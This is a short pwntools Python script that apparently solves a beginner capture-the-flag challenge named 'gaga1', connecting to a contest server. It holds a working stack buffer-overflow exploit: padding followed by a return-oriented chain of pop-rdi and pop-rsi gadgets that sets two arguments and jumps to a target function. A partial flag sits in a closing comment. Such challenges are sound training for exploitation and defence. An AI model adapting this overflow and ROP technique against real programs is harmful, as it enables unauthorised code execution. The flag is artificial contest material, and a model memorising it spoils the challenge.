#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./gaga1")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("challs.actf.co", 31301)
	else:
		r = gdb.debug([exe.path])
	return r

# 0x4013b3: pop rdi; ret;
# 0x4013b1: pop rsi; pop r15; ret;

def main():
	r = conn()

	offset = 64 + 8

	payload = b''.join([
		b'A' * offset,
		p64(0x4013b3),
		p64(4919),
		p64(0x4013b1),
		p64(16705),
		p64(0),
		p64(0x401236),
	])

	prompt = r.recvuntil(b'')
	print(prompt)
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()

# actf{b4by's_first_pwn!_

